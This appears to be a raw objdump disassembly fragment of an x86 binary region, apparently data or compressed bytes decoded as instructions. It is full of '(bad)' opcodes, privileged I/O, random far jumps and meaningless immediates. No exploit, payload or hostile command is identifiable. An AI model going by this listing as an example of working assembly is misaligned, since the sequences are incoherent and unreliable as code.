  42f1de:	mov    WORD PTR [edx],cs
  42f1e0:	inc    esi
  42f1e1:	cli    
  42f1e2:	mov    esi,0xf8ffa448
  42f1e7:	jg     0x42f19e
  42f1e9:	pop    es
  42f1ea:	stc    
  42f1eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1ec:	add    eax,0x0
	...
  42f255:	add    BYTE PTR [edx+0x26],bl
  42f258:	jecxz  0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	out    dx,al
  42f263:	mov    WORD PTR [eax+0x1f845d7],gs
  42f269:	add    bh,bh
  42f26b:	add    BYTE PTR [eax],al
  42f26d:	add    ch,cl
  42f26f:	aam    0x36
  42f271:	cmp    DWORD PTR [edx+0x4a36d61b],edx
  42f277:	xchg   ebx,eax
  42f278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f279:	clc    
  42f27a:	inc    ebp
  42f27b:	adc    ebp,0x5513b870
  42f281:	leave  
  42f282:	popa   
  42f283:	inc    esi
  42f284:	(bad)  
  42f285:	mov    ebp,0x481d923c
  42f28a:	adc    esi,esp
  42f28c:	(bad)  [ecx+0x4308a7cb]
  42f292:	imul   ebx,DWORD PTR [ecx+0x2a619e9c],0x2b7bae00
  42f29c:	out    0xb,al
  42f29e:	pop    edx
  42f29f:	dec    ebp
  42f2a0:	push   cs
  42f2a1:	mov    al,0xb7
  42f2a3:	mov    ch,0x67
  42f2a5:	ins    DWORD PTR es:[edi],dx
  42f2a6:	fwait
  42f2a7:	push   cs
  42f2a8:	fcom   DWORD PTR [ebx+0x2f2c080b]
  42f2ae:	add    al,0x89
  42f2b0:	jae    0x42f26a
  42f2b2:	dec    esp
  42f2b3:	xor    al,0x9d
  42f2b5:	mov    ecx,0x2efbc7d2
  42f2ba:	adc    BYTE PTR [edi],dh
  42f2bc:	inc    edx
  42f2bd:	add    al,0xa6
  42f2bf:	dec    ebx
  42f2c0:	repz cmp BYTE PTR [esi-0x2],bh
  42f2c4:	and    ch,0x1
  42f2c7:	mov    esi,0x4c63728b
  42f2cc:	inc    ebp
  42f2cd:	enter  0xbc6f,0x1
  42f2d1:	lock (bad) 
  42f2d3:	std    
  42f2d4:	inc    ecx
  42f2d5:	and    al,0x63
  42f2d7:	bound  esp,QWORD PTR [ecx-0x7339be11]
  42f2dd:	(bad)  
  42f2de:	mov    ds:0x5e9bd282,al
  42f2e3:	(bad)  
  42f2e4:	xor    cl,BYTE PTR [ecx]
  42f2e6:	stos   BYTE PTR es:[edi],al
  42f2e7:	mov    ecx,0x8dbc4535
  42f2ec:	push   eax
  42f2ed:	sub    DWORD PTR [eax-0x4941abac],ebx
  42f2f3:	data16 sbb al,0x9a
  42f2f6:	std    
  42f2f7:	xchg   edx,eax
  42f2f8:	scas   al,BYTE PTR es:[edi]
  42f2f9:	(bad)  
  42f2fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2fc:	dec    edx
  42f2fd:	cmp    DWORD PTR [ebp+0x1e],eax
  42f300:	xchg   ch,bl
  42f302:	jne    0x42f325
  42f304:	sar    DWORD PTR [edi],0x9e
  42f307:	jge    0x42f315
  42f309:	repnz mov dl,BYTE PTR [ebx]
  42f30c:	fs jmp 0xa6e2:0x10e13526
  42f314:	jl     0x42f375
  42f316:	push   es
  42f317:	mov    dl,0x3f
  42f319:	in     eax,dx
  42f31a:	adc    BYTE PTR [esi],dh
  42f31c:	fsubr  st,st(5)
  42f31e:	das    
  42f31f:	cmp    eax,0x4b65d75d
  42f324:	jl     0x42f352
  42f326:	hlt    
  42f327:	add    esp,esp
  42f329:	out    0xf3,al
  42f32b:	int3   
  42f32c:	jnp    0x42f2fd
  42f32e:	nop
  42f32f:	ucomiss xmm2,DWORD PTR [edx+0x7b]
  42f333:	pop    esp
  42f334:	sbb    eax,0x2ab8c52d
  42f339:	sahf   
  42f33a:	xchg   ebx,eax
  42f33b:	jl     0x42f33a
  42f33d:	cmp    ebx,DWORD PTR [edi+eiz*4+0xb]
  42f341:	lea    edi,[ecx]
  42f343:	dec    esp
  42f344:	push   edx
  42f345:	fcom   DWORD PTR [ecx+0x159f9218]
  42f34b:	pop    ebp
  42f34c:	out    dx,al
  42f34d:	jne    0x42f3a8
  42f34f:	mov    ch,BYTE PTR [ebx+0x7397b9ca]
  42f355:	out    dx,eax
  42f356:	add    BYTE PTR [edx],bh
  42f358:	lods   al,BYTE PTR ds:[esi]
  42f359:	lahf   
  42f35a:	icebp  
  42f35b:	add    BYTE PTR [edx],al
  42f35d:	mov    ?,ecx
  42f35f:	mov    ebx,0xc6e3e6ba
  42f364:	add    BYTE PTR [esp+ebx*1-0x58],ch
  42f368:	imul   ecx,esi,0xfffffffd
  42f36b:	jns    0x42f31c
	...
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	xchg   esi,eax
  42f3e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3e5:	inc    edi
  42f3e6:	inc    esp
  42f3e7:	stc    
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	inc    DWORD PTR [eax]
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	or     ebp,edx
  42f3f0:	mov    DWORD PTR [eax+0x5fdc835f],ecx
  42f3f6:	and    edx,DWORD PTR [ebp+0x32cccdca]
  42f3fc:	(bad)  [esi]
  42f3fe:	jbe    0x42f3c4
  42f400:	xchg   esi,eax
  42f401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f402:	neg    DWORD PTR [eax+ebp*1+0x62faa982]
  42f409:	mov    edx,ebp
  42f40b:	ret    
  42f40c:	jecxz  0x42f473
  42f40e:	jmp    0xc82c:0x52bf4170
  42f415:	ror    DWORD PTR [edx-0x72],1
  42f418:	ret    
  42f419:	out    0xad,eax
  42f41b:	fwait
  42f41c:	scas   eax,DWORD PTR es:[edi]
  42f41d:	adc    BYTE PTR [ecx],0x60
  42f420:	add    eax,0x8330c0cf
  42f425:	je     0x42f493
  42f427:	mov    dh,0xbe
  42f429:	mov    edx,0x30d1a39a
  42f42e:	ds stos DWORD PTR es:[edi],eax
  42f430:	add    al,0x9d
  42f432:	retf   0x94a1
  42f435:	dec    ebx
  42f436:	mov    ebp,0x6d4cfa9
  42f43b:	js     0x42f404
  42f43d:	push   ss
  42f43e:	retf   0x5199
  42f441:	outs   dx,BYTE PTR ds:[esi]
  42f442:	rcr    BYTE PTR [ebx],1
  42f444:	add    bh,BYTE PTR [edi+eiz*4+0x75]
  42f448:	stos   BYTE PTR es:[edi],al
  42f449:	dec    ebp
  42f44a:	jmp    0x42f4ab
  42f44c:	mov    bl,BYTE PTR [ecx+0x47]
  42f44f:	sbb    ch,BYTE PTR [ecx]
  42f451:	sub    BYTE PTR [esi-0x37],dl
  42f454:	je     0x42f3ed
  42f456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f457:	in     eax,0x30
  42f459:	test   edx,edi
  42f45b:	mov    DWORD PTR [esi+edi*1+0x5a],esi
  42f45f:	popa   
  42f460:	popa   
  42f461:	mov    esp,0xbcaaf583
  42f466:	call   0xd733:0xe0a7816b
  42f46d:	xor    edi,DWORD PTR [esi-0x3d]
  42f470:	mov    esp,0x99b7daea
  42f475:	gs mov edx,0xab153900
  42f47b:	ins    BYTE PTR es:[edi],dx
  42f47c:	adc    DWORD PTR [ebp-0x6b2eb8a7],0x3
  42f483:	and    DWORD PTR [edi+0x58],0xfffffffd
  42f487:	jae    0x42f4ae
  42f489:	fs mov eax,0x91137a05
  42f48f:	mov    ebp,0xaaf632c3
  42f494:	xlat   BYTE PTR ds:[ebx]
  42f495:	les    esi,FWORD PTR [ecx-0x3]
  42f498:	loope  0x42f4db
  42f49a:	fsubr  st(7),st
  42f49c:	pusha  
  42f49d:	cmp    esp,ecx
  42f49f:	ret    0xe54f
  42f4a2:	jns    0x42f4b9
  42f4a4:	addr16 hlt 
  42f4a6:	ins    DWORD PTR es:[edi],dx
  42f4a7:	ror    DWORD PTR [ebp-0x5],1
  42f4aa:	and    DWORD PTR [edx+0x66],ebp
  42f4ad:	or     eax,DWORD PTR [ebx+ebp*4]
  42f4b0:	fnstcw WORD PTR [ecx]
  42f4b2:	shl    DWORD PTR [edi-0x509c4b21],cl
  42f4b8:	adc    al,0xd1
  42f4ba:	inc    ebx
  42f4bb:	dec    edx
  42f4bc:	pop    ss
  42f4bd:	pop    ss
  42f4be:	sbb    al,0x63
  42f4c0:	(bad)
  42f4c4:	das    
  42f4c5:	xor    al,0x85
  42f4c7:	outs   dx,BYTE PTR ds:[esi]
  42f4c8:	pop    ss
  42f4c9:	imul   eax,DWORD PTR [ebx+edx*2-0x342c82e0],0xffffffae
  42f4d1:	lock iret 
  42f4d3:	and    al,0x13
  42f4d5:	sti    
  42f4d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4d7:	dec    ecx
  42f4d8:	test   bl,ch
  42f4da:	add    al,0xe3
  42f4dc:	jne    0x42f4ed
  42f4de:	int3   
  42f4df:	int    0x58
  42f4e1:	(bad)  
  42f4e3:	mov    cs,WORD PTR [esi-0x48]
  42f4e6:	pop    eax
  42f4e7:	sub    bl,ah
  42f4e9:	pop    es
  42f4ea:	pop    ecx
  42f4eb:	push   eax
  42f4ec:	add    eax,0x0
	...
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	mov    bh,0xc9
  42f564:	sbb    al,0xf4
  42f566:	inc    ebx
  42f567:	cli    
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	inc    DWORD PTR [eax]
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	mov    esi,0x21360503
  42f573:	hlt    
  42f574:	iret   
  42f575:	loopne 0x42f5b8
  42f577:	and    DWORD PTR ds:0x8b27d69f,edx
  42f57d:	cmp    eax,DWORD PTR [eax]
  42f57f:	xchg   esp,eax
  42f580:	mov    ecx,0xd36af560
  42f585:	daa    
  42f586:	pushf  
  42f587:	out    0x9a,eax
  42f589:	hlt    
  42f58a:	leave  
  42f58b:	mov    cl,0x90
  42f58d:	je     0x42f5d7
  42f58f:	iret   
  42f590:	fdivp  st(5),st
  42f592:	mov    ch,0xaa
  42f594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f595:	sbb    al,BYTE PTR [edx]
  42f597:	shl    BYTE PTR [edx-0x4bc2fc8],0xf1
  42f59e:	fwait
  42f59f:	pop    ebx
  42f5a0:	(bad)  
  42f5a1:	outs   dx,DWORD PTR ds:[esi]
  42f5a2:	adc    ah,ah
  42f5a4:	and    BYTE PTR [ebp-0x2874ea2e],0x3b
  42f5ab:	xchg   edx,eax
  42f5ac:	xchg   ebx,ecx
  42f5ae:	mov    cl,0xc6
  42f5b0:	jns    0x42f5e3
  42f5b2:	dec    ecx
  42f5b3:	jb     0x42f54d
  42f5b5:	xchg   BYTE PTR [esi],bh
  42f5b7:	test   eax,0xc1173e34
  42f5bc:	and    BYTE PTR ds:0xc020dae1,bh
  42f5c2:	nop
  42f5c3:	dec    ebx
  42f5c4:	add    BYTE PTR [ebx],bh
  42f5c6:	aaa    
  42f5c7:	pop    es
  42f5c8:	inc    esp
  42f5c9:	jmp    FWORD PTR [ecx]
  42f5cb:	adc    al,0x2d
  42f5cd:	aaa    
  42f5ce:	outs   dx,DWORD PTR ds:[esi]
  42f5cf:	aam    0xfb
  42f5d1:	pop    ebx
  42f5d2:	(bad)
  42f5d5:	and    eax,0x32de7c03
  42f5da:	aad    0x83
  42f5dc:	jno    0x42f608
  42f5de:	xor    eax,0x752ac9de
  42f5e3:	js     0x42f62d
  42f5e5:	fwait
  42f5e6:	jb     0x42f5b4
  42f5e8:	push   ds
  42f5e9:	sbb    esi,DWORD PTR [eax]
  42f5eb:	scas   al,BYTE PTR es:[edi]
  42f5ec:	(bad)  
  42f5ee:	jae    0x42f5b0
  42f5f0:	(bad)  [eax-0x6b]
  42f5f3:	daa    
  42f5f4:	adc    eax,DWORD PTR [ecx]
  42f5f6:	pop    ds
  42f5f7:	jmp    0x42f674
  42f5f9:	inc    edx
  42f5fa:	add    cl,BYTE PTR [eax+0x23]
  42f5fd:	inc    ebp
  42f5fe:	bound  ebp,QWORD PTR [esp+ebx*1+0x20d4cb31]
  42f605:	xlat   BYTE PTR ds:[ebx]
  42f606:	neg    DWORD PTR [esi]
  42f608:	repz pop ds
  42f60a:	jno    0x42f633
  42f60c:	mov    ch,0x48
  42f60e:	adc    ebx,ebx
  42f610:	data16 adc al,0x16
  42f613:	add    ebp,DWORD PTR [eax+edi*4-0x1b]
  42f617:	test   DWORD PTR [ebp-0x49],ebp
  42f61a:	inc    edx
  42f61b:	shl    DWORD PTR [esi],0x3e
  42f61e:	scas   eax,DWORD PTR es:[edi]
  42f61f:	cmp    eax,0xc6cb3624
  42f624:	mov    DWORD PTR [ecx],edi
  42f626:	je     0x42f688
  42f628:	and    DWORD PTR [eax-0x19],0x3f10773e
  42f62f:	test   DWORD PTR [edx],0xebaa35fb
  42f635:	into   
  42f636:	stos   DWORD PTR es:[edi],eax
  42f637:	mov    ch,0xc7
  42f639:	in     eax,dx
  42f63a:	imul   ecx,edx,0xb85f276d
  42f640:	in     al,0x78
  42f642:	push   0xffffffa6
  42f644:	repz xor al,0x27
  42f647:	into   
  42f648:	rcr    BYTE PTR ds:0x20334868,1
  42f64e:	loopne 0x42f656
  42f650:	imul   eax,DWORD PTR [ecx+edx*8+0x4b],0x5c
  42f655:	neg    DWORD PTR [eax+ebx*1]
  42f658:	js     0x42f698
  42f65a:	or     eax,0xd321ca8e
  42f65f:	ret    
  42f660:	inc    ebx
  42f661:	dec    ebx
  42f662:	xchg   edx,eax
  42f663:	sbb    al,0x53
  42f665:	push   0x8
  42f667:	cmp    bh,ah
  42f669:	sub    ecx,DWORD PTR [ebx-0x3a]
  42f66c:	inc    edi
	...
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	push   ebx
  42f6e3:	pusha  
  42f6e4:	push   es
  42f6e5:	mov    eax,ds:0x1fb42
  42f6ea:	inc    DWORD PTR [eax]
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	jmp    0x42f742
  42f6f0:	xchg   esi,eax
  42f6f1:	std    
  42f6f2:	mov    bh,0x70
  42f6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6f5:	aas    
  42f6f6:	(bad)  
  42f6f7:	inc    ebp
  42f6f8:	cdq    
  42f6f9:	cs mov esp,0x3ebb5c6f
  42f6ff:	add    eax,0xe2d547c8
  42f704:	popa   
  42f705:	icebp  
  42f706:	rol    dh,1
  42f708:	(bad)  
  42f709:	cld    
  42f70a:	test   BYTE PTR [edx+0x4b],al
  42f70d:	dec    ebp
  42f70e:	mov    dh,0x1c
  42f710:	fnstcw WORD PTR [eax-0x6d06f319]
  42f716:	iret   
  42f717:	inc    ebp
  42f718:	jb     0x42f6e3
  42f71a:	sbb    BYTE PTR [edi+0x2e],cl
  42f71d:	sub    DWORD PTR [esi-0x6f],esp
  42f720:	xor    DWORD PTR [ecx-0x4ac5be65],ebx
  42f726:	push   es
  42f727:	mov    ecx,0x48d77d42
  42f72c:	jo     0x42f724
  42f72e:	xchg   DWORD PTR [ecx],ebx
  42f730:	ret    
  42f731:	fs js  0x42f73c
  42f734:	mov    al,0xf9
  42f736:	popa   
  42f737:	pop    ecx
  42f738:	aam    0xdf
  42f73a:	out    0x99,al
  42f73c:	(bad)  
  42f73d:	aad    0xc7
  42f73f:	fnstcw WORD PTR [ebp+ecx*8-0x3c1fa836]
  42f746:	gs jmp 0x2b43:0xdfb8e0d1
  42f74e:	xor    BYTE PTR [edx-0x74],dl
  42f751:	retf   0xb8e2
  42f754:	xor    DWORD PTR [edi],eax
  42f756:	jg     0x42f6e8
  42f758:	das    
  42f759:	sbb    eax,0x5248ea9b
  42f75e:	(bad)  
  42f75f:	clc    
  42f760:	out    0x5d,eax
  42f762:	mov    BYTE PTR [edi-0x10],cl
  42f765:	or     bl,BYTE PTR [esi]
  42f767:	inc    ecx
  42f768:	inc    ecx
  42f769:	jns    0x42f768
  42f76b:	(bad)  [ebx]
  42f76d:	jae    0x42f7ea
  42f76f:	loopne 0x42f6fa
  42f771:	mov    ah,0x2c
  42f773:	in     al,dx
  42f774:	sbb    DWORD PTR [eax],0xffffff80
  42f777:	cmp    bh,dl
  42f779:	ror    DWORD PTR [ebp+edi*4-0x351cddef],cl
  42f780:	xchg   esi,eax
  42f781:	ins    DWORD PTR es:[edi],dx
  42f782:	aas    
  42f783:	cmp    BYTE PTR [ecx-0x76cdb653],ch
  42f789:	fistp  WORD PTR ds:0xfa61c456
  42f78f:	jmp    0xf3601fd4
  42f794:	sbb    DWORD PTR [edi+0x1c3ddcee],ebp
  42f79a:	push   0xab4122a3
  42f79f:	pop    ecx
  42f7a0:	mov    ebp,0x468c28d6
  42f7a5:	sub    dl,BYTE PTR [eax+0x71]
  42f7a8:	mov    eax,ds:0xd485c556
  42f7ad:	fldenv [ecx+ebx*1-0x34]
  42f7b1:	xchg   ebp,eax
  42f7b2:	pop    eax
  42f7b3:	sti    
  42f7b4:	or     BYTE PTR [edx-0x20],bh
  42f7b7:	push   edx
  42f7b8:	fs shl DWORD PTR es:[ecx-0x66cdad51],cl
  42f7c0:	pop    edi
  42f7c1:	xor    al,0x54
  42f7c3:	cdq    
  42f7c4:	mov    esp,0x8942cabe
  42f7c9:	and    BYTE PTR [ecx],bh
  42f7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f7cc:	sbb    ch,BYTE PTR fs:[ebx-0x7d]
  42f7d0:	aam    0xa0
  42f7d2:	jne    0x42f78f
  42f7d4:	pusha  
  42f7d5:	mov    eax,ds:0x2625b103
  42f7da:	jg     0x42f7b6
  42f7dc:	pop    edi
  42f7dd:	xchg   ecx,eax
  42f7de:	retf   0xbb72
  42f7e1:	test   BYTE PTR [ebx+0x51],dh
  42f7e4:	jecxz  0x42f852
  42f7e6:	test   esp,esi
  42f7e8:	fcom   DWORD PTR ds:0xe03451
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x3c15ce
  42f866:	inc    ecx
  42f867:	cld    
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	inc    DWORD PTR [eax]
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	cmp    BYTE PTR [edi+ecx*1],al
  42f871:	ret    
  42f872:	scas   al,BYTE PTR es:[edi]
  42f873:	gs clc 
  42f875:	push   ebp
  42f876:	cwde   
  42f877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f878:	push   esi
  42f879:	push   ecx
  42f87a:	fistp  QWORD PTR [ecx]
  42f87c:	das    
  42f87d:	ret    
  42f87e:	ss (bad) 
  42f880:	sub    al,BYTE PTR [esi+0x29]
  42f883:	jge    0x42f87b
  42f885:	xchg   ebp,edx
  42f887:	lds    ecx,FWORD PTR [edi+eiz*8-0x777cded1]
  42f88e:	cli    
  42f88f:	pop    esp
  42f890:	sub    BYTE PTR [ecx],dh
  42f892:	or     edx,0x1096c6a9
  42f898:	xchg   esp,eax
  42f899:	scas   eax,DWORD PTR es:[edi]
  42f89a:	jno    0x42f8d5
  42f89c:	mov    esi,0xec75831a
  42f8a1:	mov    ds:0x3b1de226,al
  42f8a6:	ficomp WORD PTR [edx+0x6e]
  42f8a9:	or     DWORD PTR [edi+0x58],esp
  42f8ac:	(bad)  
  42f8ad:	sbb    esi,ebp
  42f8af:	retf   0xf3d2
  42f8b2:	pop    edx
  42f8b3:	mov    WORD PTR [eax+0x27c51899],?
  42f8b9:	imul   esi,DWORD PTR [edx],0x8e072cca
  42f8bf:	mov    eax,ds:0x83e1aeaf
  42f8c4:	or     eax,0x9b9d166d
  42f8c9:	retf   0x70e6
  42f8cc:	sub    eax,0x8b1e4b88
  42f8d1:	xor    dl,dl
  42f8d3:	xor    eax,ebp
  42f8d5:	daa    
  42f8d6:	xlat   BYTE PTR ds:[ebx]
  42f8d7:	hlt    
  42f8d8:	mov    ebp,DWORD PTR [esi+0x57]
  42f8db:	call   0xbdd0:0xd65b5ef4
  42f8e2:	das    
  42f8e3:	gs mov dl,BYTE PTR gs:[ebx+0x6cc569cc]
  42f8eb:	imul   ebx,DWORD PTR ds:0x4001ed78,0xfffffffa
  42f8f2:	jmp    0x5b76:0xe1ffa43c
  42f8f9:	and    DWORD PTR [eax-0x69984584],eax
  42f8ff:	xor    DWORD PTR [eax+ecx*2+0x3d],eax
  42f903:	inc    edx
  42f904:	pop    ds
  42f905:	stc    
  42f906:	jecxz  0x42f93b
  42f908:	adc    DWORD PTR [eax],ebx
  42f90a:	and    bh,BYTE PTR [ebx+0x45]
  42f90d:	mul    BYTE PTR ds:0xb780e8b2
  42f913:	call   0xaa9c:0x88df0f3c
  42f91a:	aad    0xb
  42f91c:	ret    0xd28a
  42f91f:	hlt    
  42f920:	cmp    DWORD PTR [edi+0x3f92f366],eax
  42f926:	xor    edi,DWORD PTR [ecx]
  42f928:	xor    eax,0x86e618e6
  42f92d:	shl    BYTE PTR [eax+0x2b],0xb6
  42f931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f932:	popf   
  42f933:	sbb    ebp,edx
  42f935:	add    DWORD PTR [edi-0x13299f5a],0xffffffb0
  42f93c:	xchg   esi,eax
  42f93d:	ja     0x42f9a8
  42f93f:	sbb    DWORD PTR [edx+0x3ba7e006],ebp
  42f945:	xchg   edi,eax
  42f946:	out    0x9f,eax
  42f948:	clc    
  42f949:	xchg   DWORD PTR [eax+0x5d66fd14],edx
  42f94f:	dec    ecx
  42f950:	cmp    DWORD PTR [edx-0x19],0x2d4271f0
  42f957:	pop    edi
  42f958:	dec    esi
  42f959:	(bad)  
  42f95a:	ss add ah,ah
  42f95d:	cmp    DWORD PTR [ecx-0x4e592acc],0x9132acb9
  42f967:	pop    es
  42f968:	jle    0x42f92e
  42f96a:	loop   0x42f92b
  42f96c:	nop
	...
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f9d6
  42f9e3:	inc    edx
  42f9e4:	jb     0x42f9ce
  42f9e6:	inc    eax
  42f9e7:	std    
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	inc    DWORD PTR [eax]
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	pop    esp
  42f9ef:	dec    esi
  42f9f0:	jle    0x42fa0c
  42f9f2:	adc    eax,0x40c6f516
  42f9f7:	sub    DWORD PTR [edx+ecx*8],ebx
  42f9fa:	mov    esi,0xcc8a5e41
  42f9ff:	popa   
  42fa00:	or     DWORD PTR [ebx+0x530419a7],edi
  42fa06:	xlat   BYTE PTR ds:[ebx]
  42fa07:	das    
  42fa08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa09:	bound  edx,QWORD PTR [ecx+eax*2-0x20]
  42fa0d:	repnz mov eax,ds:0x19e0a767
  42fa13:	fnstsw WORD PTR ds:0xbcbe7fef
  42fa19:	cmp    bh,BYTE PTR [esi]
  42fa1b:	add    esp,DWORD PTR [edx+0x67]
  42fa1e:	jns    0x42f9f4
  42fa20:	ds aam 0x93
  42fa23:	repnz daa 
  42fa25:	xor    al,0x3
  42fa27:	leave  
  42fa28:	push   0xffffffa7
  42fa2a:	xlat   BYTE PTR ds:[ebx]
  42fa2b:	jmp    0x42f9e3
  42fa2d:	out    0x5e,eax
  42fa2f:	mov    ebp,0xeb4423e5
  42fa34:	xchg   esp,eax
  42fa35:	test   DWORD PTR [edx+0x1639b555],esi
  42fa3b:	mov    al,ds:0x33dee1b
  42fa40:	dec    esi
  42fa41:	gs xchg edi,eax
  42fa43:	stos   BYTE PTR es:[edi],al
  42fa44:	push   ebp
  42fa45:	je     0x42fa71
  42fa47:	jle    0x42fa62
  42fa49:	pushf  
  42fa4a:	jo     0x42fa13
  42fa4c:	mov    WORD PTR [edx-0x53779d80],?
  42fa52:	sub    eax,DWORD PTR [ecx]
  42fa54:	mov    ah,0x1a
  42fa56:	push   0xffffffb7
  42fa58:	(bad)  
  42fa59:	adc    DWORD PTR [eax+0x2340f679],esi
  42fa5f:	inc    ecx
  42fa60:	sub    eax,0xd73beae8
  42fa65:	xchg   esi,ebp
  42fa67:	pushf  
  42fa68:	(bad)  
  42fa6a:	fdiv   QWORD PTR [ebx]
  42fa6c:	push   es
  42fa6d:	pop    ecx
  42fa6e:	scas   al,BYTE PTR es:[edi]
  42fa6f:	out    0x2e,eax
  42fa71:	xchg   edx,eax
  42fa72:	stos   BYTE PTR es:[edi],al
  42fa73:	inc    BYTE PTR [edx+edi*8-0x4e]
  42fa77:	mov    ds:0x6589a961,al
  42fa7c:	xor    eax,0xe2f0e88c
  42fa81:	lock movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  42fa84:	push   edi
  42fa85:	(bad)  
  42fa86:	idiv   dh
  42fa88:	jb     0x42fac4
  42fa8a:	fs (bad) 
  42fa8d:	call   0xe178:0x689cd628
  42fa94:	int3   
  42fa95:	or     edx,edi
  42fa97:	inc    edi
  42fa98:	cmp    eax,DWORD PTR [edx-0x47]
  42fa9b:	cmp    ch,cl
  42fa9d:	dec    ecx
  42fa9e:	mov    ch,BYTE PTR [eax+esi*2-0x15]
  42faa2:	and    ax,0x969a
  42faa6:	popf   
  42faa7:	xor    BYTE PTR [eax],0x55
  42faaa:	(bad)  
  42faab:	neg    DWORD PTR [ebx+ebp*8]
  42faae:	cmp    DWORD PTR [edx+ebp*1+0x4bc615e6],edi
  42fab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fab6:	stc    
  42fab7:	dec    eax
  42fab8:	pop    es
  42fab9:	rcr    BYTE PTR [ebp+0x38],cl
  42fabc:	stc    
  42fabd:	or     dh,dh
  42fabf:	mov    al,BYTE PTR [edx+ecx*2-0x1d]
  42fac3:	sub    DWORD PTR [esi-0x7],0x33
  42fac7:	fisttp WORD PTR [esi]
  42fac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42faca:	push   ebx
  42facb:	addr16 mov eax,ebx
  42face:	jns    0x42fb05
  42fad0:	sbb    BYTE PTR [ebx-0x716b88b0],ah
  42fad6:	pushf  
  42fad7:	sbb    BYTE PTR [ecx+edi*1-0x12],al
  42fadb:	jp     0x42fad2
  42fadd:	and    BYTE PTR [edx-0x4b888f94],0x68
  42fae4:	pushf  
  42fae5:	in     eax,0xbf
  42fae7:	cmp    esp,0xffffffdb
  42faea:	bound  ecx,QWORD PTR [esi]
  42faec:	int3   
	...
  42fb55:	add    BYTE PTR [ebx],bl
  42fb57:	out    dx,eax
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	je     0x42fb72
  42fb64:	xchg   ebx,eax
  42fb65:	sbb    al,0x3f
  42fb67:	inc    BYTE PTR [ecx]
  42fb69:	add    bh,bh
  42fb6b:	add    BYTE PTR [eax],al
  42fb6d:	add    BYTE PTR [ebx],cl
  42fb6f:	shl    BYTE PTR [ebx-0x5741d2c6],cl
  42fb75:	sti    
  42fb76:	mov    DWORD PTR [edi+eax*2-0x5023201e],0xa729ebe4
  42fb81:	aas    
  42fb82:	mov    ds:0xd6be95e9,eax
  42fb87:	jmp    ebx
  42fb89:	das    
  42fb8a:	xor    BYTE PTR [edi-0x3859a9f1],ah
  42fb90:	sbb    edi,eax
  42fb92:	jns    0x42fbcd
  42fb94:	sbb    DWORD PTR [edi-0x2e],edx
  42fb97:	int3   
  42fb98:	jnp    0x42fc00
  42fb9a:	int3   
  42fb9b:	xchg   ecx,eax
  42fb9c:	lds    eax,FWORD PTR [ebx]
  42fb9e:	mov    al,ds:0x7400e512
  42fba3:	mul    BYTE PTR [eax-0x4efac076]
  42fba9:	test   DWORD PTR [ebp-0x720a5281],ebx
  42fbaf:	aaa    
  42fbb0:	adc    edi,0xfffffff2
  42fbb3:	xlat   BYTE PTR ds:[ebx]
  42fbb4:	pop    esi
  42fbb5:	aad    0xf7
  42fbb7:	mov    BYTE PTR [edi],dl
  42fbb9:	cdq    
  42fbba:	jmp    0x81c4895e
  42fbbf:	into   
  42fbc0:	jbe    0x42fba0
  42fbc2:	cwde   
  42fbc3:	or     edx,DWORD PTR [ecx+0x56]
  42fbc6:	adc    eax,0x725761a4
  42fbcb:	mov    cl,BYTE PTR [ebp-0x2d]
  42fbce:	(bad)  
  42fbcf:	xor    eax,0xf8d3b438
  42fbd4:	inc    ebx
  42fbd5:	repz loope 0x42fbf8
  42fbd8:	xor    DWORD PTR [eax-0x101cd38e],eax
